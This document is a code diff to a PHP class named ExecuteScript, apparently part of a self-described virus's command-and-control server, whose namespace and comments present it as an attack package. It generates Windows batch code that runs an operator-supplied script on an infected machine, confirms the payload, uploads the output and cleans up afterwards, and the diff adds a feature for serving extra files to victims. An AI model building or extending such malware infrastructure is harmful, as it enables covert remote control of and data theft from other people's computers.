@@ -4,6 +4,7 @@ namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
 use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
+use Kelvinho\Virus\Singleton\Header;
 
 /**
  * Class ExecuteScript. Executes a random script
@@ -17,6 +18,7 @@ class ExecuteScript extends AttackBase {
     private string $data = "";
     private string $script = "";
     private string $error = "";
+    private array $extras = [];
 
     public function getScript(): string {
         return $this->script;
@@ -42,15 +44,23 @@ class ExecuteScript extends AttackBase {
         $this->error = $error;
     }
 
-    public function generateBatchCode(): string {
-        ob_start(); //@formatter:off ?>
+    public function getExtras(): array {
+        return $this->extras;
+    }
+
+    public function setExtras(string $extras) {
+        $this->extras = json_decode($extras);
+    }
+
+    public function generateBatchCode(): void {
+        //@formatter:off ?>
         chCp 65001
-        echo _>%~pd0data
-        echo _>%~pd0err
+        echo _>"%~pd0data"
+        echo _>"%~pd0err"
         <?php echo $this->script . "\n";
         echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
         echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean(); //@formatter:on
+        //@formatter:on
     }
 
     private function generateUploadCode(): string {
@@ -60,6 +70,13 @@ class ExecuteScript extends AttackBase {
     }
 
     public function processExtras(string $resourceIdentifier): void {
+        foreach ($this->extras as $extra) {
+            if ($resourceIdentifier === $extra["identifier"]) {
+                echo $extra["content"];
+                Header::ok();
+            }
+        }
+        Header::notFound();
     }
 
     protected function setState(string $json): void {
@@ -67,6 +84,7 @@ class ExecuteScript extends AttackBase {
         $this->data = $state["data"];
         $this->script = $state["script"];
         $this->error = $state["error"];
+        $this->extras = $state["extras"] ?? [];
     }
 
     protected function getState(): string {
@@ -74,6 +92,7 @@ class ExecuteScript extends AttackBase {
         $state["data"] = $this->data;
         $state["error"] = $this->error;
         $state["script"] = $this->script;
+        $state["extras"] = $this->extras;
         return json_encode($state);
     }
 }
